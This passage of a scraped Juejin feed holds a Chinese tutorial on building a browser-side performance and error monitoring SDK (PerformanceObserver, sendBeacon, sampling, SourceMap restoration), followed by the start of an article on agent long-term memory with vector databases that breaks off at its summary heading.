s-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><blockquote>
<p><strong>写在前面</strong></p>
<p>很多团队依赖后端日志来排查前端问题，这是隔靴搔痒。 后端接口 200 OK，不代表前端渲染成功；CDN 资源 404，后端根本感知不到；JS 逻辑报错，后端更是一脸懵逼。</p>
<p>真正的 <strong>前端监控 (RUM - Real User Monitoring)</strong> 必须运行在<strong>浏览器端</strong>。</p>
<p>市面上有 Sentry、Datadog 等成熟产品，为什么架构师还要懂怎么从 0 到 1 搭建？</p>
<ol>
<li><strong>成本：</strong> SAAS 真的很贵，流量大了买不起。</li>
<li><strong>定制：</strong> 你需要结合业务数据（如：用户等级、订单 ID）进行深度分析。</li>
<li><strong>原理：</strong> 理解了原理，你才能更好地使用工具，而不是被工具限制。</li>
</ol>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/810efec84b2840a096fa1f49fbc3fc35~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv546L5aOu5aOu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770709416&amp;x-signature=yJ9HlMx5ISApjEBgy5iQdq90P5c%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-0">一、 系统架构：数据的旅程</h2>
<p>一个完整的 APM 系统，其数据流向可以概括为四个阶段：</p>
<ol>
<li><strong>采集 (Collection):</strong> 埋伏在浏览器里的 SDK，负责监听一切。</li>
<li><strong>上报 (Reporting):</strong> 也就是“如何把数据运出去”，不仅要快，还不能阻塞业务。</li>
<li><strong>清洗与存储 (Processing):</strong> 原始数据是乱七八糟的，需要解析 UserAgent、映射 SourceMap。</li>
<li><strong>消费 (Visualization):</strong> 报警大屏、性能趋势图、错误堆栈还原。</li>
</ol>
<hr/>
<h2 data-id="heading-1">二、 采集层：SDK 的核心设计</h2>
<p>SDK 是监控系统的“探头”。作为架构师，设计 SDK 时要遵循 <strong>“无侵入、低开销”</strong> 的原则。</p>
<h3 data-id="heading-2">2.1 性能采集：PerformanceObserver</h3>
<p>别再用 <code>performance.timing</code> 了，那个 API 已经过时且精度不够。 现代监控 SDK 必须使用 <strong><code>PerformanceObserver</code></strong> API，它可以被动订阅各种性能事件。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 核心代码：订阅 LCP 和 CLS</span>
<span class="hljs-keyword">const</span> observer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PerformanceObserver</span>(<span class="hljs-function">(<span class="hljs-params">entryList</span>) =&gt;</span> {
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> entry <span class="hljs-keyword">of</span> entryList.<span class="hljs-title function_">getEntries</span>()) {
    <span class="hljs-keyword">if</span> (entry.<span class="hljs-property">entryType</span> === <span class="hljs-string">'largest-contentful-paint'</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'LCP:'</span>, entry.<span class="hljs-property">startTime</span>);
      <span class="hljs-comment">// report(entry.startTime)</span>
    }
    <span class="hljs-keyword">if</span> (entry.<span class="hljs-property">entryType</span> === <span class="hljs-string">'layout-shift'</span> &amp;&amp; !entry.<span class="hljs-property">hadRecentInput</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'CLS:'</span>, entry.<span class="hljs-property">value</span>);
      <span class="hljs-comment">// accumulateCLS(entry.value)</span>
    }
  }
});

observer.<span class="hljs-title function_">observe</span>({ <span class="hljs-attr">type</span>: <span class="hljs-string">'largest-contentful-paint'</span>, <span class="hljs-attr">buffered</span>: <span class="hljs-literal">true</span> });
observer.<span class="hljs-title function_">observe</span>({ <span class="hljs-attr">type</span>: <span class="hljs-string">'layout-shift'</span>, <span class="hljs-attr">buffered</span>: <span class="hljs-literal">true</span> });
</code></pre>
<p><strong>架构要点：</strong> 加上 <code>buffered: true</code> 很重要，否则你会漏掉 SDK 初始化之前发生的性能指标。</p>
<h3 data-id="heading-3">2.2 错误捕获：不仅仅是 try-catch</h3>
<p>前端错误分三种，SDK 需要全覆盖：</p>
<ol>
<li><strong>JS 运行时错误:</strong> <code>window.onerror</code>。</li>
<li><strong>Promise 未捕获异常:</strong> <code>window.onunhandledrejection</code>（这是现代应用最常见的白屏原因）。</li>
<li><strong>资源加载失败:</strong> <code>window.addEventListener('error', handler, true)</code>。注意要在<strong>捕获阶段</strong>监听，因为资源错误不冒泡。</li>
</ol>
<h3 data-id="heading-4">2.3 行为回溯：还原案发现场</h3>
<p>当报错发生时，只有堆栈是不够的。我们需要知道<strong>用户在报错前干了什么</strong>。 SDK 需要默认劫持（Hook）用户的交互行为，维护一个“行为队列（Breadcrumbs）”：</p>
<ul>
<li>用户点击了哪个 DOM？</li>
<li>用户路由跳到了哪？</li>
<li>用户发起过哪个 API 请求？</li>
</ul>
<p>当报错发生时，把这个队列一并上报。这样你就能复现：“哦，原来是先点了A，再点了B，最后接口 500 导致 JS 崩了。”</p>
<hr/>
<h2 data-id="heading-5">三、 上报层：优雅的数据传输</h2>
<p>监控数据虽然重要，但它是<strong>次要任务</strong>。绝不能因为上报监控数据，导致业务请求变慢。</p>
<h3 data-id="heading-6">3.1 黄金通道：navigator.sendBeacon</h3>
<p>这是一个专门为分析数据设计的 API。</p>
<ul>
<li><strong>特点：</strong> 即使页面关闭（Unload），数据也能发出去。</li>
<li><strong>优势：</strong> 不占用主线程，不会阻塞页面跳转。</li>
</ul>

<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'unload'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> data = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(metricsQueue);
  navigator.<span class="hljs-title function_">sendBeacon</span>(<span class="hljs-string">'/api/report'</span>, data);
});
</code></pre>
<h3 data-id="heading-7">3.2 闲时上报：requestIdleCallback</h3>
<p>对于非紧急数据（如性能打点），不要产生 HTTP 请求风暴。 利用 <code>requestIdleCallback</code>，等到浏览器<strong>空闲</strong>的时候再打包发送。</p>
<h3 data-id="heading-8">3.3 抽样策略 (Sampling)</h3>
<p>如果你的网站 PV 有 1 个亿，全量上报会让后端数据库原地爆炸。 架构师需要在 SDK 端设计抽样逻辑：</p>
<ul>
<li><strong>性能数据：</strong> 抽样 1% - 10% 即可，足以反映趋势。</li>
<li><strong>错误数据：</strong> 必须 <strong>100%</strong> 上报（或者对同一种错误进行客户端聚合去重）。</li>
</ul>
<hr/>
<h2 data-id="heading-9">四、 处理层：让数据说人话</h2>
<p>后端收到的数据是压缩混淆过的代码堆栈，比如 <code>at a.b (app.min.js:1:500)</code>。这对于开发者来说毫无意义。</p>
<h3 data-id="heading-10">4.1 SourceMap 还原服务</h3>
<p>你需要搭建一个内部服务（通常结合 CI/CD）：</p>
<ol>
<li><strong>构建时：</strong> Webpack/Vite 打包生成 <code>.map</code> 文件。</li>
<li><strong>上传时：</strong> 将 <code>.map</code> 文件上传到监控系统的私有存储（<strong>绝不能上传到公网 CDN！</strong> ）。</li>
<li><strong>解析时：</strong> 监控系统收到报错 <code>line 1, col 500</code>，去私有存储里找对应的 map 文件，通过 <code>mozilla/source-map</code> 库还原出 <code>src/components/Header.vue</code> 的第 25 行。</li>
</ol>
<h3 data-id="heading-11">4.2 智能聚合</h3>
<p>同一个 Bug 可能触发 10 万次报错。监控系统必须具备<strong>指纹算法 (Fingerprinting)</strong> ，将堆栈信息相似的错误聚合为一个 Issue，否则报警群会被消息淹没。</p>
<hr/>
<h2 data-id="heading-12">五、 实战建议：自研还是购买？</h2>
<p>这是架构师经常面临的决策。</p>
<h3 data-id="heading-13">方案 A：购买 SaaS (Sentry / Datadog / 阿里云 ARMS)</h3>
<ul>
<li><strong>优点：</strong> 功能强大，部署简单，支持 SourceMap 管理。</li>
<li><strong>缺点：</strong> 贵。数据敏感性问题。</li>
<li><strong>适用：</strong> 初创团队，快速验证，预算充足。</li>
</ul>
<h3 data-id="heading-14">方案 B：开源自建 (Sentry On-Premise)</h3>
<ul>
<li><strong>优点：</strong> 代码免费，功能同 SaaS。</li>
<li><strong>缺点：</strong> Sentry 的部署维护极其复杂（依赖 Kafka, Redis, ClickHouse 等一堆组件），需要专门的运维支持。</li>
</ul>
<h3 data-id="heading-15">方案 C：轻量级自研 (SDK + Node + ClickHouse/ES)</h3>
<ul>
<li><strong>优点：</strong> 完全贴合业务，成本最低。</li>
<li><strong>缺点：</strong> 需要开发资源，初期功能简陋。</li>
<li><strong>适用：</strong> 中大型团队，有定制化需求（如需要关联内部的用户行为路径）。</li>
</ul>
<p><strong>架构师建议：</strong> 如果你是中小团队，直接接入 <strong>Sentry (SaaS)</strong> 是 ROI 最高的选择。不要为了造轮子而造轮子。 如果你是大型互联网公司，通常会基于 <strong>Web Vitals 库 + 自研 SDK + 大数据平台</strong> 来构建，因为数据量太大，且需要和业务数据打通。</p>
<hr/>
<h2 data-id="heading-16">结语：不仅是看，更是感知</h2>
<p>搭建好了 APM，我们就像拥有了“千里眼”。 我们可以自信地告诉老板：“昨天下午 3 点，北京地区电信网络的用户，LCP 升高了 20%，原因是 CDN 节点故障。”而不是含糊地说：“好像网络有点抖。”</p>
<p>既然有了眼睛，看到了问题，接下来就要动手解决了。 除了之前学过的代码层面的优化，架构师还需要建立一套<strong>分层级的优化战术</strong>，从协议层到渲染层，全面围剿性能瓶颈。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[如何管理Agent的长期记忆与向量数据库]]></title>    <link>https://juejin.cn/post/7602191709389258794</link>    <guid>https://juejin.cn/post/7602191709389258794</guid>    <pubDate>2026-02-03T06:32:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602191709389258794" data-draft-id="7602177588443578387" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="如何管理Agent的长期记忆与向量数据库"/> <meta itemprop="keywords" content="面试"/> <meta itemprop="datePublished" content="2026-02-03T06:32:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CyanYuMu"/> <meta itemprop="url" content="https://juejin.cn/user/3317648514620313"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            如何管理Agent的长期记忆与向量数据库
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3317648514620313/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CyanYuMu
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T06:32:16.000Z" title="Tue Feb 03 2026 06:32:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">如何管理Agent的长期记忆</h2>
<p>很多对于RAG的考察都喜欢问Agent的长期记忆如何持久化。向量数据库的选择标准是什么？我们简单来分析一下具体实现。</p>
<h3 data-id="heading-1">现有认知</h3>
<p>Agent的长期记忆持久化主要通过向量数据库存储embedding实现，具体流程是对话历史，用户偏好只是片段经过embedding转换为向量，存入向量数据库，后续通过语义检索召回相关记忆。这个过程的核心在于解决一个关键问题：当用户有成千上万条历史记录时，怎么快速找到语义相关的那几条？传统数据库擅长精确匹配，但 Agent 需要语义理解。大部分人在和AI对话其实没有特别注重如何投放提示词，而是很随意的提问，比如用户问 “上次那个便宜的推荐”，系统要能关联到历史对话里的价格敏感信息，这就需要向量相似度检索而不是 SQL 的模糊查询。
选择向量数据库时需要关注几个核心维度。性能层面看查询延迟和吞吐量，生产环境通常要求毫秒级响应，像Milvus在百万级数据下能保持较好性能。索引算法很关键，HNSW 适合高稠密向量的快速检索，IVF 系列适合大规模场景。（具体的算法细节想了解可以去wiki百科查一下）。过滤能力决定能否结合元数据筛选，比如按时间范围或用户 ID 过滤记忆，这在多租户场景必不可少。还要考虑混合检索支持，很多场景需要向量检索和关键词检索结合，像 Weaviate 原生支持这种能力。数据规模也影响选型，小规模可用 Chroma 这类嵌入式方案，企业级应用更适合自建 Milvus 集群这些。
至于生态适配。langchain框架是由非常成熟的集成，而我最近在关注的eino里面也支持了一整套如embeding,retreiver组件。挺好的</p>
<h3 data-id="heading-2">分析</h3>
<p>我们要更加系统的分析记忆分层架构与持久化链路的话。首先需要知道：要分层管理不同时效的信息。短期记忆就是当前对话的上下文，通常存在内存或 Redis 里，会话结束就清理掉，这部分主要服务于单次对话的连贯性。长期记忆是需要跨会话保留的信息，比如用户的消费偏好、历史咨询问题、积累的知识片段，这部分才需要持久化到向量数据库。有些复杂场景还会有情景记忆，记录特定任务的执行过程，方便后续复盘或继续执行未完成的任务。使用向量数据库是因为传统 SQL 根本匹配不上文字不同语义相近的两句话，但它们语义是相关的。向量化就是把文本映射到高维空间，语义相近的句子在空间中距离更近，这样就能通过计算向量相似度（通常用余弦距离或欧氏距离）找到相关记忆。具体实现上，会通过 OpenAI 的 text-embedding 模型或者开源的 BERT 模型把文本转成 768 维或 1536 维的浮点数向量。</p>
<h5 data-id="heading-3">总结一下</h5>
